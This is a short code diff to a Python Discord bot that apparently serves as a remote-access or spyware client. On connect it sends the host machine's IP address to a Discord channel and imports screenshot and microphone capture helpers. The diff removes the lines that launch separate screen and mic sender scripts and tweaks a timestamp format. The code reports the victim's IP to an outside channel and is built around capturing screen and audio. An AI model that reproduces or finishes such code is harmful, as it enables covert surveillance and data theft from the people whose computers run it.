@@ -3,8 +3,6 @@ from discord.ext import commands
 import os
 import socket
 import time
-import subprocess
-import pyautogui
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
@@ -54,10 +52,10 @@ async def on_ready():
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
 
-    await channel.send(f"{ip_address} connected at {time.strftime('%D:%H:%M:%S')}")
+    await channel.send(f"{ip_address} connected at {time.strftime('%m-%d-%H-%M-%S')}")
 
-    # subprocess.run(["python", "src\\mic_sender.py"])
-    subprocess.run(["python", "src\\screen_sender.py"])
+    # somehow run the other sender scripts from here
+
     await listen()
-
+   
 bot.run(os.getenv("TOKEN"))
